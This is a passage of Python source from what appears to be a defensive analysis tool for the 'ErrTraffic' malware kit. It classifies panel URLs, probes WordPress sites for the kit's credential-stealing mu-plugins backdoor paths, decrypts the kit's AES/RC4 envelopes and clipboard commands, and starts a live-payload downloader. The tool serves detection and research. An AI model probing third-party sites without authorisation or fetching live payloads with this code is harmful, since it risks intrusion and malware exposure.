        "host_defanged": _defang(p.hostname) if p.hostname else None,
        "path":     p.path,
        "action":   action,
        "token":    token_val,
        "token_alias": token_alias,    # which param name carried the token
        "os":       qget("os") or None,
        "src":      src_val,
        "src_alias": src_alias,
        "mode":     qget("mode") or None,
        "cb":       qget("cb") or None,
        "ref":      qget("ref") or None,
        # BW v2: `q` carries the encrypted envelope on signed-outgoing-request URLs
        "envelope_q": qget("q") or None,
    }
    # known role
    if action in ("dl","download"):                       info["role"] = "payload_download"
    elif action in ("cfg","settings"):                    info["role"] = "config_fetch"
    elif action == "evt":                                 info["role"] = "telemetry"
    elif action == "init":                                info["role"] = "session_init"
    elif action in ("generateDownloadToken","gen-token"): info["role"] = "token_generation"
    elif "css.js" in path:                                info["role"] = "obfuscated_loader"
    elif info["envelope_q"]:                              info["role"] = "encrypted_envelope_request"
    # ── v2 endpoints (where the action is in the path, not the query string)
    elif "generate-download-token.php" in path:           info["role"] = "token_generation"
    elif "download.php" in path:                          info["role"] = "payload_download"
    elif "log.php" in path:                               info["role"] = "telemetry"
    else:                                                 info["role"] = "unknown"
    return info


# ============================================================================
# Server / endpoint fingerprinting — DNS + ports + TLS cert  (cached)
# ============================================================================
_SERVER_FP_CACHE: dict[str, dict] = {}
_SERVER_FP_LOCK  = threading.Lock()

def probe_wordpress_backdoor(origin: str, *, timeout: int = 6,
                              verify_tls: bool = True) -> dict:
    """Passive probe for the ErrTraffic WordPress backdoor footprint, per
    LevelBlue 2026 + Sucuri 2025. The kit drops a base64-decoded session-manager.php
    into /wp-content/mu-plugins/ to capture admin credentials and ensure persistence
    (mu-plugins auto-load on every WP request, no manual activation needed).

    We probe a small set of common backdoor paths via HEAD/GET and report what
    is/isn't reachable. We DO NOT execute anything — pure observation. A 200 OR
    a strongly-suggestive non-200 (e.g. PHP error page, 403 from an existing
    file) is reported with the body excerpt so the analyst can decide.

    Returns: {"checked": int, "hits": [{path, status, content_type, body_head, signal}],
              "wp_admin_redirect_check": {...}, "notes": [str...]}.
    Caller decides confidence — we just report what we saw."""
    from urllib.parse import urljoin
    origin = origin.rstrip("/")
    # Paths to probe — only ErrTraffic-attributed mu-plugins names per LevelBlue
    # 2026, plus the parent dir for listing detection. We deliberately do NOT
    # probe wp-includes/js/dist/script-modules/.../view.min.js: that's a
    # legitimate WP 6.4+ Interactivity API file present on EVERY WP site of
    # that version, not a kit IOC by itself.
    paths = [
        # ErrTraffic-specific (LevelBlue 2026 — session-manager.php in mu-plugins)
        ("/wp-content/mu-plugins/session-manager.php", "errtraffic_backdoor_levelblue"),
        ("/wp-content/mu-plugins/",                     "mu_plugins_dir_listing"),
        # Common companion-backdoor names (Sucuri / Hudson Rock observations)
        ("/wp-content/mu-plugins/auto-loader.php",      "mu_plugins_loader_unusual"),
        ("/wp-content/mu-plugins/wp-load.php",          "mu_plugins_wpload_unusual"),
    ]
    headers = {"User-Agent": _BROWSER_UA,
               "Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
    hits = []
    cf_intercept_count = 0

    def _is_cf_interstitial(att: dict) -> bool:
        """Detect when the response was served by Cloudflare's error /
        challenge handler rather than the origin server itself."""
        hdrs = att.get("response_headers") or {}
        body = (att.get("body_text_head") or "").lower()
        return (
            (hdrs.get("server") or "").lower() == "cloudflare"
            and (
                "cloudflare" in body or "cf-ray" in body
                or "ie6 oldie" in body          # the CF classic 403/404 template
                or "<!doctype html>\r" in body  # CF interstitial CRLF signature
                or att.get("status") in (403, 503, 520, 521, 522, 523, 524, 525, 526)
                and "<!doctype html" in body
            )
        )

    for path, signal_name in paths:
        url = origin + path
        att = _http_get_safe(url, headers, timeout, max_bytes=8192)
        if att["status"] is None:
            continue  # network error — not informative
        if att["status"] == 404:
            continue  # path absent — not a hit (don't log noise)
        cf_blocked = _is_cf_interstitial(att)
        if cf_blocked:
            cf_intercept_count += 1
        body_head = (att["body_text_head"] or "")[:200]
        # Confidence tier for THIS hit:
        #   high   = 200 + non-empty body + content-type that suggests PHP execution
        #   medium = 200 + 0-byte body (could be backdoor returning empty for our
        #            probe, OR an empty file, OR a cache hit). Ambiguous.
        #   low    = 403/401 served by origin (path exists but ACL'd)
        #   intercepted = 403/5xx served by Cloudflare (we can't tell what's there)
        if cf_blocked:
            tier = "cf_intercepted"
        elif att["status"] == 200 and (att.get("bytes") or 0) > 0:
            tier = "high"
        elif att["status"] == 200:
            tier = "medium"  # 0 bytes — ambiguous
        elif att["status"] in (401, 403):
            tier = "low"
        else:
            tier = "low"
        hits.append({
            "path":            path,
            "url":             url,
            "status":          att["status"],
            "content_type":    att["content_type"],
            "bytes":           att["bytes"],
            "body_head":       body_head,
            "signal":          signal_name,
            "cf_intercepted":  cf_blocked,
            "confidence_tier": tier,
        })
    notes = []
    high_conf_hits = [h for h in hits if h["confidence_tier"] == "high"
                       and h["signal"] == "errtraffic_backdoor_levelblue"]
    medium_conf_hits = [h for h in hits if h["confidence_tier"] == "medium"
                         and h["signal"] == "errtraffic_backdoor_levelblue"]
    if high_conf_hits:
        notes.append("session-manager.php returned HTTP 200 with a non-empty body — "
                     "strong indicator of ErrTraffic PHP backdoor (LevelBlue 2026). "
                     "Manually inspect the body to confirm.")
    elif medium_conf_hits:
        notes.append("session-manager.php returned HTTP 200 but 0-byte body. "
                     "Ambiguous — could be the backdoor silently returning empty "
                     "for our request, an empty placeholder file, or a CDN cache "
                     "hit. NOT confirmation of the backdoor by itself.")
    if cf_intercept_count > 0:
        notes.append(f"{cf_intercept_count} of {len(paths)} responses were served "
                     "by Cloudflare's edge (not the origin server) — these "
                     "tell us nothing about what files actually exist on disk.")
    if not hits:
        notes.append("No probed paths returned a non-404 response. Absence is NOT "
                     "proof the backdoor isn't present (mu-plugins is usually not "
                     "listable and the kit may use other filenames).")
    return {"checked": len(paths), "hits": hits, "notes": notes,
            "cf_intercepted_count": cf_intercept_count}


def fingerprint_server(host: str, *, timeout: float = 4.0,
                       probe_ports: tuple = (443, 80, 8443),
                       fetch_cert: bool = True) -> dict:
    """Resolve DNS, probe a few common ports, grab the TLS cert (peer cert
    only — passive, no full handshake content). Cached by hostname."""
    import socket
    host = host.lower().strip().rstrip(".")
    if not host: return {"error": "no host"}
    with _SERVER_FP_LOCK:
        cached = _SERVER_FP_CACHE.get(host)
    if cached: return {**cached, "from_cache": True}
    out: dict = {"host": host, "ip": None, "ips": [], "cname": None,
                 "open_ports": [], "tls_cert": None, "error": None,
                 "from_cache": False}
    # DNS A
    try:
        infos = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
        ips = sorted({ai[4][0] for ai in infos if ai[0] == socket.AF_INET})
        out["ips"] = ips
        out["ip"]  = ips[0] if ips else None
    except Exception as e:
        out["error"] = f"dns: {e}"
        with _SERVER_FP_LOCK: _SERVER_FP_CACHE[host] = out
        return out
    # CNAME (best-effort via socket; not all hosts have CNAME)
    try:
        canonical = socket.gethostbyname_ex(host)[0]
        if canonical.lower().rstrip(".") != host:
            out["cname"] = canonical
    except Exception: pass
    # Port probe (TCP connect, no banner read except for 443)
    for port in probe_ports:
        try:
            with socket.create_connection((out["ip"], port), timeout=timeout):
                out["open_ports"].append(port)
        except Exception: pass
    # TLS cert from 443 if it's open
    if fetch_cert and 443 in out["open_ports"]:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((out["ip"], 443), timeout=timeout) as raw:
                with ctx.wrap_socket(raw, server_hostname=host) as s:
                    der = s.getpeercert(binary_form=True)
                    cert = s.getpeercert()
            if cert:
                out["tls_cert"] = {
                    "subject":    dict(x[0] for x in cert.get("subject", [])),
                    "issuer":     dict(x[0] for x in cert.get("issuer", [])),
                    "not_before": cert.get("notBefore"),
                    "not_after":  cert.get("notAfter"),
                    "san":        [v for _,v in cert.get("subjectAltName", [])],
                    "fingerprint_sha256": hashlib.sha256(der).hexdigest() if der else None,
                }
        except Exception as e:
            out["tls_cert"] = {"error": str(e)[:120]}
    with _SERVER_FP_LOCK: _SERVER_FP_CACHE[host] = out
    return out


# ============================================================================
# AES-CBC for ErrTraffic clipboard recovery
#  - Prefers pycryptodome / cryptography if installed (fast, vetted)
#  - Falls back to a CORRECT pure-Python AES (table-driven; ~slow but tiny payload sizes)
#  - Reference: NIST FIPS-197 + standard MixColumns/InvMixColumns Galois-field multiply
# ============================================================================
_AES_SBOX = bytes.fromhex(
    "637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca472c0"
    "b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b275"
    "09832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4c58cf"
    "d0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110fff3d2"
    "cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814de5e0bdb"
    "e0323a0a4906245cc2d3ac629195e479e7c8376d8dd54ea96c56f4ea657aae08"
    "ba78252e1ca6b4c6e8dd741f4bbd8b8a703eb5664803f60e613557b986c11d9e"
    "e1f8981169d98e949b1e87e9ce5528df8ca1890dbfe6426841992d0fb054bb16")
_AES_INV_SBOX = bytes(_AES_SBOX.index(i) for i in range(256))
_AES_RCON = (0,1,2,4,8,16,32,64,128,27,54,108,216,171,77,154)


def _gmul_build(n: int) -> bytes:
    """Build a GF(2^8) multiplication table for byte * n, mod 0x11b."""
    out = bytearray(256)
    for b in range(256):
        a, k, p = b, n, 0
        for _ in range(8):
            if k & 1: p ^= a
            hi = a & 0x80
            a = (a << 1) & 0xff
            if hi: a ^= 0x1b
            k >>= 1
        out[b] = p
    return bytes(out)

_GMUL2  = _gmul_build(2);  _GMUL3  = _gmul_build(3)
_GMUL9  = _gmul_build(9);  _GMUL11 = _gmul_build(11)
_GMUL13 = _gmul_build(13); _GMUL14 = _gmul_build(14)


def _aes_expand_key_flat(key: bytes) -> list[int]:
    """Expand AES key into a flat list of round-key bytes (16 per round)."""
    nk = len(key) // 4
    nr = {16: 10, 24: 12, 32: 14}[len(key)]
    w = bytearray(key)
    for i in range(nk, 4 * (nr + 1)):
        t = bytearray(w[(i-1)*4:i*4])
        if i % nk == 0:
            t = bytearray([_AES_SBOX[t[1]] ^ _AES_RCON[i//nk],
                           _AES_SBOX[t[2]], _AES_SBOX[t[3]], _AES_SBOX[t[0]]])
        elif nk > 6 and i % nk == 4:
            t = bytearray(_AES_SBOX[b] for b in t)
        for j in range(4):
            w.append(w[(i-nk)*4 + j] ^ t[j])
    return list(w)


def _aes_inv_round(state: list[int], rk: list[int]):
    """One inverse AES round (in-place). state and rk are 16-byte lists."""
    # AddRoundKey
    for i in range(16): state[i] ^= rk[i]
    # InvMixColumns
    for c in range(4):
        a = state[c*4]; b = state[c*4+1]; cc = state[c*4+2]; d = state[c*4+3]
        state[c*4]   = _GMUL14[a] ^ _GMUL11[b] ^ _GMUL13[cc] ^ _GMUL9[d]
        state[c*4+1] = _GMUL9[a]  ^ _GMUL14[b] ^ _GMUL11[cc] ^ _GMUL13[d]
        state[c*4+2] = _GMUL13[a] ^ _GMUL9[b]  ^ _GMUL14[cc] ^ _GMUL11[d]
        state[c*4+3] = _GMUL11[a] ^ _GMUL13[b] ^ _GMUL9[cc]  ^ _GMUL14[d]


def _aes_inv_shift_rows(s: list[int]):
    """Row i is shifted right by i (inverse of encryption's left shift)."""
    # row 1 (indexes 1,5,9,13): rotate right by 1
    s[1], s[5], s[9], s[13]   = s[13], s[1], s[5], s[9]
    # row 2: rotate right by 2 (= swap pairs)
    s[2], s[6], s[10], s[14]  = s[10], s[14], s[2], s[6]
    # row 3: rotate right by 3 (= rotate left by 1)
    s[3], s[7], s[11], s[15]  = s[7], s[11], s[15], s[3]


def _aes_decrypt_block(block: bytes, rks: list[int]) -> bytes:
    nr = (len(rks) // 16) - 1
    s = list(block)
    # initial AddRoundKey with last round key
    rk_off = nr * 16
    for i in range(16): s[i] ^= rks[rk_off + i]
    # nr-1 main inverse rounds
    for rnd in range(nr - 1, 0, -1):
        _aes_inv_shift_rows(s)
        for i in range(16): s[i] = _AES_INV_SBOX[s[i]]
        _aes_inv_round(s, rks[rnd*16:(rnd+1)*16])
    # final round (no InvMixColumns)
    _aes_inv_shift_rows(s)
    for i in range(16): s[i] = _AES_INV_SBOX[s[i]]
    for i in range(16): s[i] ^= rks[i]
    return bytes(s)


def aes_cbc_decrypt(key: bytes, iv: bytes, ct: bytes) -> bytes:
    """AES-128/192/256-CBC decrypt + PKCS7 unpad. Uses pycryptodome /
    cryptography if installed (fast); falls back to vendored pure-Python."""
    if len(key) not in (16, 24, 32):
        raise ValueError(f"AES key must be 16/24/32 bytes, got {len(key)}")
    if len(iv) != 16:
        raise ValueError(f"AES IV must be 16 bytes, got {len(iv)}")
    if len(ct) % 16 != 0 or not ct:
        raise ValueError(f"AES CT length must be a positive multiple of 16, got {len(ct)}")
    pt = None
    try:
        from Crypto.Cipher import AES as _PCAes        # pycryptodome
        pt = _PCAes.new(key, _PCAes.MODE_CBC, iv=iv).decrypt(ct)
    except ImportError: pass
    if pt is None:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            d = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
            pt = d.update(ct) + d.finalize()
        except ImportError: pass
    if pt is None:
        rks = _aes_expand_key_flat(key)
        pt = b""; prev = iv
        for i in range(0, len(ct), 16):
            blk = ct[i:i+16]
            dec = _aes_decrypt_block(blk, rks)
            pt += bytes(a ^ b for a, b in zip(dec, prev))
            prev = blk
    # PKCS7 unpad
    padlen = pt[-1] if pt else 0
    if 1 <= padlen <= 16 and pt[-padlen:] == bytes([padlen]) * padlen:
        pt = pt[:-padlen]
    return pt


# ============================================================================
# AES-256-GCM for ErrTraffic v3 (BW v2 generation) API envelope (`enc:"gcm1"`)
#   - Prefers pycryptodome / cryptography if installed
#   - Falls back to a CORRECT pure-Python AES-GCM
#   - Encryption block primitive (CTR keystream) built on top of the existing
#     AES key-schedule (_aes_expand_key_flat) + table-driven GF(2^8) ops above
# ============================================================================

def _aes_shift_rows(s: list[int]):
    """Forward ShiftRows — row i shifted left by i. Inverse of _aes_inv_shift_rows."""
    s[1], s[5], s[9], s[13]   = s[5], s[9], s[13], s[1]
    s[2], s[6], s[10], s[14]  = s[10], s[14], s[2], s[6]
    s[3], s[7], s[11], s[15]  = s[15], s[3], s[7], s[11]


def _aes_mix_columns(s: list[int]):
    """Forward MixColumns — multiply each column by the fixed matrix in GF(2^8)."""
    for c in range(4):
        a = s[c*4]; b = s[c*4+1]; cc = s[c*4+2]; d = s[c*4+3]
        s[c*4]   = _GMUL2[a] ^ _GMUL3[b] ^ cc ^ d
        s[c*4+1] = a ^ _GMUL2[b] ^ _GMUL3[cc] ^ d
        s[c*4+2] = a ^ b ^ _GMUL2[cc] ^ _GMUL3[d]
        s[c*4+3] = _GMUL3[a] ^ b ^ cc ^ _GMUL2[d]


def _aes_encrypt_block(block: bytes, rks: list[int]) -> bytes:
    """Forward AES block encryption — needed for GCM (CTR mode keystream + GHASH H)."""
    nr = (len(rks) // 16) - 1
    s = list(block)
    # Initial AddRoundKey
    for i in range(16): s[i] ^= rks[i]
    # nr-1 main rounds
    for rnd in range(1, nr):
        for i in range(16): s[i] = _AES_SBOX[s[i]]
        _aes_shift_rows(s)
        _aes_mix_columns(s)
        rk_off = rnd * 16
        for i in range(16): s[i] ^= rks[rk_off + i]
    # Final round (no MixColumns)
    for i in range(16): s[i] = _AES_SBOX[s[i]]
    _aes_shift_rows(s)
    rk_off = nr * 16
    for i in range(16): s[i] ^= rks[rk_off + i]
    return bytes(s)


def _gf128_mul(x: int, y: int) -> int:
    """Galois-field GF(2^128) multiplication, NIST SP 800-38D bit ordering
    (most-significant bit first). Reduction polynomial: x^128 + x^7 + x^2 + x + 1.

    Operands are 128-bit big-endian ints. Returns the 128-bit product as int.
    Pure-Python; only invoked when no AES-GCM library is available, so speed is
    not critical (envelope payloads are <1KB).
    """
    z = 0
    v = y
    # Iterate bits of x from MSB to LSB (NIST GCM convention).
    for i in range(127, -1, -1):
        if (x >> i) & 1:
            z ^= v
        # v = v >> 1 in GF, with reduction if LSB was set before shift
        if v & 1:
            v = (v >> 1) ^ 0xE1000000000000000000000000000000
        else:
            v >>= 1
    return z


def _ghash(h_int: int, data: bytes) -> int:
    """Compute GHASH(H, data). `data` must already be the
    GHASH input (AAD_padded || CT_padded || lenAAD_64 || lenCT_64)."""
    y = 0
    for i in range(0, len(data), 16):
        block = data[i:i+16].ljust(16, b"\x00")
        y ^= int.from_bytes(block, "big")
        y = _gf128_mul(y, h_int)
    return y


def _aes_gcm_decrypt_pyfallback(key: bytes, iv: bytes, ct_with_tag: bytes,
                                 aad: bytes = b"", tag_length: int = 16) -> bytes:
    """Pure-Python AES-GCM decrypt + auth-verify. Raises on tag mismatch.

    NIST SP 800-38D compliant. Used only when neither pycryptodome nor
    cryptography is installed. Envelope payloads are small (<2KB typical),
    so the O(n*128) pure-Python GHASH is acceptable.
    """
    if len(key) not in (16, 24, 32):
        raise ValueError(f"AES-GCM key must be 16/24/32 bytes, got {len(key)}")
    if tag_length not in (12, 13, 14, 15, 16):
        raise ValueError(f"GCM tag length must be 12..16, got {tag_length}")
    if len(ct_with_tag) < tag_length:
        raise ValueError(f"GCM ciphertext shorter than tag length")
    ct  = ct_with_tag[:-tag_length]
    tag = ct_with_tag[-tag_length:]
    rks = _aes_expand_key_flat(key)
    # Hash subkey H = AES_E(K, 0^128)
    h_block = _aes_encrypt_block(b"\x00" * 16, rks)
    h_int   = int.from_bytes(h_block, "big")
    # Initial counter J0
    if len(iv) == 12:
        j0 = iv + b"\x00\x00\x00\x01"
    else:
        # GHASH(H, IV || 0^s || 0^64 || lenIV_64)
        pad = (-len(iv)) % 16
        ghash_iv = iv + b"\x00" * pad + b"\x00" * 8 + (len(iv) * 8).to_bytes(8, "big")
        j0_int  = _ghash(h_int, ghash_iv)
        j0      = j0_int.to_bytes(16, "big")
    # CTR-mode decrypt — counter starts at J0+1
    pt = bytearray()
    ctr_int = int.from_bytes(j0, "big")
    for i in range(0, len(ct), 16):
        ctr_int = ((ctr_int & ~((1 << 32) - 1)) |
                   ((ctr_int + 1) & ((1 << 32) - 1)))
        keystream = _aes_encrypt_block(ctr_int.to_bytes(16, "big"), rks)
        block_ct  = ct[i:i+16]
        pt.extend(a ^ b for a, b in zip(keystream[:len(block_ct)], block_ct))
    # Auth: compute expected tag
    aad_pad = (-len(aad)) % 16
    ct_pad  = (-len(ct))  % 16
    ghash_in = (aad + b"\x00" * aad_pad +
                ct  + b"\x00" * ct_pad  +
                (len(aad) * 8).to_bytes(8, "big") +
                (len(ct)  * 8).to_bytes(8, "big"))
    s_int    = _ghash(h_int, ghash_in)
    e_j0     = _aes_encrypt_block(j0, rks)
    expected = (s_int ^ int.from_bytes(e_j0, "big")).to_bytes(16, "big")[:tag_length]
    # Constant-time compare
    diff = 0
    for x, y in zip(expected, tag): diff |= x ^ y
    if diff != 0 or len(expected) != len(tag):
        raise ValueError("AES-GCM authentication tag mismatch")
    return bytes(pt)


def aes_gcm_decrypt(key: bytes, iv: bytes, ct_with_tag: bytes,
                    aad: bytes = b"", tag_length: int = 16) -> bytes:
    """AES-128/192/256-GCM decrypt + auth-verify. Prefers pycryptodome /
    cryptography if installed (much faster); falls back to vendored pure-Python.
    Raises ValueError on tag mismatch (authenticated encryption guarantees)."""
    if len(key) not in (16, 24, 32):
        raise ValueError(f"AES-GCM key must be 16/24/32 bytes, got {len(key)}")
    if len(iv) < 1:
        raise ValueError("AES-GCM IV must be non-empty")
    try:
        from Crypto.Cipher import AES as _PCAes        # pycryptodome
        ct  = ct_with_tag[:-tag_length]
        tag = ct_with_tag[-tag_length:]
        cipher = _PCAes.new(key, _PCAes.MODE_GCM, nonce=iv, mac_len=tag_length)
        if aad: cipher.update(aad)
        return cipher.decrypt_and_verify(ct, tag)
    except ImportError: pass
    except ValueError as e:
        # tag mismatch from pycryptodome — re-raise with our message style
        raise ValueError(f"AES-GCM authentication tag mismatch ({e})") from None
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(key).decrypt(iv, ct_with_tag, aad if aad else None)
    except ImportError: pass
    except Exception as e:
        raise ValueError(f"AES-GCM authentication tag mismatch ({e.__class__.__name__})") from None
    return _aes_gcm_decrypt_pyfallback(key, iv, ct_with_tag, aad=aad, tag_length=tag_length)


# ============================================================================
# RC4 for ErrTraffic v3 legacy `q2` envelope mode
#   - Trivial cipher; vendored directly (no library preference needed).
# ============================================================================

def rc4(key: bytes, data: bytes) -> bytes:
    """RC4 stream cipher (encrypt == decrypt). 256-byte KSA + PRGA, no drop bytes
    — matches the kit's loader-side rc4() exactly."""
    if not key: raise ValueError("RC4 key must be non-empty")
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 0xff
        s[i], s[j] = s[j], s[i]
    out = bytearray(len(data))
    i = j = 0
    for k in range(len(data)):
        i = (i + 1) & 0xff
        j = (j + s[i]) & 0xff
        s[i], s[j] = s[j], s[i]
        out[k] = data[k] ^ s[(s[i] + s[j]) & 0xff]
    return bytes(out)


# ============================================================================
# decrypt_api_envelope — Python port of the kit's loader-side decryptApiEnvelope.
# ============================================================================
# Mirrors the JS exactly:
#   1. Reject non-objects / missing q field early.
#   2. If enc == "gcm1": derive AES-256 key as sha256(API_Q2_KEY || scope+"|gcm1"),
#      base64-url-decode q into [iv(12) || ct_with_tag(rest)], decrypt.
#      On GCM failure, fall back to obj.q2 RC4 path if present (the JS does this).
#   3. If enc == "q2": base64-url-decode q into [nonce(8) || ct], RC4 with
#      key = base_key || nonce.
#   4. JSON-parse the UTF-8 plaintext.
#
# `scope` is one of {"cfg","init","dl","evt"} and defaults to "cfg" per the JS.
# Returns the parsed JSON object or raises ValueError on a hard decrypt failure.

def _b64url_decode(s: str) -> bytes:
    """Base64-url-safe decode with auto-padding. Matches the kit's b64urlToBytes."""
    s = s.replace("-", "+").replace("_", "/")
    return base64.b64decode(s + "=" * (-len(s) % 4), validate=False)


def decrypt_api_envelope(obj: dict, *, scope: str = "cfg",
                          base_key_hex: str | None = None) -> dict:
    """Decrypt an ErrTraffic v3 (BW v2) API envelope.

    Args:
        obj:  the raw JSON response from /api/index.php?a=cfg|settings|init|dl
        scope: the endpoint scope used in the key-derivation salt. Must match
               /^[a-z0-9_]{1,16}$/i; the kit defaults to "cfg" if invalid.
        base_key_hex: the API_Q2_KEY_HEX (64 hex chars = 32 bytes). When omitted,
               uses the documented current key from `ERRTRAFFIC_KIT['bw_v2_keys']`
               if populated, else raises ValueError.

    Returns the parsed plaintext JSON, or raises ValueError on failure.

    Implementation matches the kit's loader-side `decryptApiEnvelope()` exactly
    (Polygon panel /api/css.js, BW v2 generation).
    """
    if not isinstance(obj, dict): raise ValueError("envelope must be a dict")
    q = obj.get("q")
    if not isinstance(q, str) or not q: raise ValueError("envelope missing 'q'")
    # Resolve base key: explicit > kit table > error
    if base_key_hex is None:
        base_key_hex = (ERRTRAFFIC_KIT.get("bw_v2_keys") or {}).get("API_Q2_KEY_HEX")
    if not base_key_hex:
        raise ValueError("no API_Q2_KEY_HEX provided (and none in ERRTRAFFIC_KIT['bw_v2_keys'])")
    if not re.fullmatch(r'[0-9a-fA-F]{64}', base_key_hex):
        raise ValueError(f"API_Q2_KEY_HEX must be 64 hex chars (got {len(base_key_hex)})")
    base_key = bytes.fromhex(base_key_hex)
    # Validate scope per the kit's regex; fall through to default on bad input
    if not re.fullmatch(r'[a-z0-9_]{1,16}', scope, re.I):
        scope = "cfg"
    enc = obj.get("enc")
    last_err = None
    if enc == "gcm1":
        try:
            packed = _b64url_decode(q)
            if len(packed) < 12 + 16 + 1: raise ValueError("gcm1: packed too short")
            iv  = packed[:12]
            ct  = packed[12:]                                         # cipher || 16B tag
            key = hashlib.sha256(base_key + (scope + "|gcm1").encode("utf-8")).digest()
            plain = aes_gcm_decrypt(key, iv, ct, tag_length=16)
            return json.loads(plain.decode("utf-8"))
        except Exception as e:
            last_err = e
            # The kit's JS falls back to obj.q2 (RC4) when gcm1 fails — mirror it.
            q2 = obj.get("q2")
            if isinstance(q2, str) and q2:
                try:
                    p2     = _b64url_decode(q2)
                    if len(p2) < 9: raise ValueError("q2 fallback: packed too short")
                    nonce  = p2[:8]
                    cipher = p2[8:]
                    key_mat = base_key + nonce
                    plain  = rc4(key_mat, cipher)
                    return json.loads(plain.decode("utf-8"))
                except Exception as e2:
                    last_err = e2
            raise ValueError(f"gcm1 decrypt failed: {last_err}")
    if enc == "q2":
        try:
            packed = _b64url_decode(q)
            if len(packed) < 9: raise ValueError("q2: packed too short")
            nonce  = packed[:8]
            cipher = packed[8:]
            key_mat = base_key + nonce
            plain  = rc4(key_mat, cipher)
            return json.loads(plain.decode("utf-8"))
        except Exception as e:
            raise ValueError(f"q2 decrypt failed: {e}")
    raise ValueError(f"unknown envelope enc={enc!r}")


def try_recover_clipboard_aes(text: str) -> dict | None:
    """If `text` contains the ErrTraffic AES kit pattern (3 FromBase64String
    blobs feeding RijndaelManaged in Key/IV/CT order), decrypt + return the
    recovered clipboard command. Returns None if not present or decode fails."""
    if not _AES_RE.search(text): return None
    blobs = _FB64_RE.findall(text)
    if len(blobs) < 3: return None
    # Filter out the very-small-but-not-AES-sized junk; we need: key=32B, IV=16B, CT=16B*n
    decoded = []
    for b in blobs:
        try:
            raw = base64.b64decode(b + "=" * (-len(b) % 4), validate=False)
            decoded.append((b, raw))
        except Exception: continue
    if len(decoded) < 3: return None
    # Identify by canonical AES-CBC shape:
    #   key  = 32 bytes (AES-256) — kit's documented choice
    #   IV   = 16 bytes (one AES block)
    #   CT   = largest 16-byte-aligned blob, longer than IV
    ct_cand  = max(decoded, key=lambda kv: len(kv[1]) if len(kv[1]) % 16 == 0 else 0)
    if len(ct_cand[1]) <= 16 or len(ct_cand[1]) % 16 != 0:
        return {"ok": False, "reason": f"no 16B-aligned ciphertext blob found "
                                       f"(sizes={[len(r) for _, r in decoded]})"}
    key_cand = next(((b, r) for b, r in decoded if len(r) == 32), None)
    iv_cand  = next(((b, r) for b, r in decoded
                     if len(r) == 16 and r != ct_cand[1]), None)
    if not key_cand or not iv_cand:
        return {"ok": False, "reason": (f"AES blob shape mismatch (need 32B key + 16B IV + "
                                        f"≥32B CT; got sizes "
                                        f"{[len(r) for _, r in decoded]})")}
    try:
        pt_bytes = aes_cbc_decrypt(key_cand[1], iv_cand[1], ct_cand[1])
    except Exception as e:
        return {"ok": False, "reason": f"AES decrypt failed: {e}"}
    pt = pt_bytes.decode("utf-8", errors="replace")
    # also pull the ErrTraffic URL from the recovered plaintext, if present
    urls_in_pt = sorted({u for u in _URL_RE.findall(pt)})
    parsed = None
    for u in urls_in_pt:
        info = parse_errtraffic_panel_url(u)
        if info and info["role"] == "payload_download":
            parsed = info; break
    return {
        "ok":               True,
        "key_b64":          key_cand[0],
        "iv_b64":           iv_cand[0],
        "ct_b64_head":      ct_cand[0][:48] + ("…" if len(ct_cand[0]) > 48 else ""),
        "ct_bytes":         len(ct_cand[1]),
        "plaintext_bytes":  len(pt_bytes),
        "plaintext_excerpt": pt[:600] + ("…" if len(pt) > 600 else ""),
        "urls_in_plaintext":     urls_in_pt[:10],
        "urls_in_plaintext_defanged": [_defang(u) for u in urls_in_pt[:10]],
        "errtraffic_payload_url": parsed,
        "sha256":            hashlib.sha256(pt_bytes).hexdigest(),
    }


# ============================================================================
# Safe payload downloader   (--payload mode)
# ============================================================================
# Process-lifetime cache by (panel_origin, os_type) so 1000s of compromised
# pages pointing at the same panel only get fetched once per OS.
_PAYLOAD_CACHE: dict[tuple, dict] = {}
_PAYLOAD_CACHE_LOCK = threading.Lock()


def _safe_filename(s: str) -> str:
    """Slugify a string for use as a filename. Strips scheme, refangs `[.]`,
    replaces non-alnum with single underscores, collapses runs of underscores."""
    s = _refang(s).replace("://", "_").strip("/")
    s = re.sub(r'[^A-Za-z0-9._-]+', '_', s)   # one run of bad chars -> ONE underscore
    s = s.strip("._-")[:80]
    return s or "out"


def _detect_file_magic(data: bytes) -> str:
    """Return a coarse file-type label from magic bytes.

    Distinguishes the four payload classes ErrTraffic supports per-OS
    (windows = PE, mac = Mach-O, android = APK, linux = ELF or shell) plus
    common companion types. Covers fat-binary Mach-O headers, scripts beyond
    /bin/* (zsh, python, perl), and the ZIP-vs-APK ambiguity (APKs always
    contain AndroidManifest.xml — checked here cheaply via substring scan
    of the first 8 KB)."""
    if not data: return "empty"
    # Windows
    if data.startswith(b"MZ"):                          return "pe_windows"
    if data[:4] == b"\xd0\xcf\x11\xe0":                  return "msi_or_office"
    # Linux
    if data.startswith(b"\x7fELF"):                      return "elf_linux"
    # macOS — Mach-O (thin + fat)
    if data[:4] in (b"\xfe\xed\xfa\xce", b"\xfe\xed\xfa\xcf",
                     b"\xce\xfa\xed\xfe", b"\xcf\xfa\xed\xfe"): return "macho_mac"
    if data[:4] in (b"\xca\xfe\xba\xbe", b"\xbe\xba\xfe\xca"): return "macho_fat_mac"
    if data[:4] == b"#!/u" and b"osascript" in data[:200]:    return "osascript_mac"
    # Android / Java / generic ZIP
    if data[:4] == b"PK\x03\x04":
        head = data[:8192]
        if b"AndroidManifest.xml" in head:               return "apk_android"
        if b"classes.dex" in head:                        return "apk_android"
        if b"META-INF/MANIFEST.MF" in head:              return "jar_java"
        return "zip"
    if data[:4] == b"\x03\x00\x08\x00":                   return "dex_android"
    # Shell scripts (Linux/mac/cross-platform)
    if data[:11] == b"#!/bin/bash":                       return "bash_script"
    if data[:9]  == b"#!/bin/sh":                         return "shell_script"
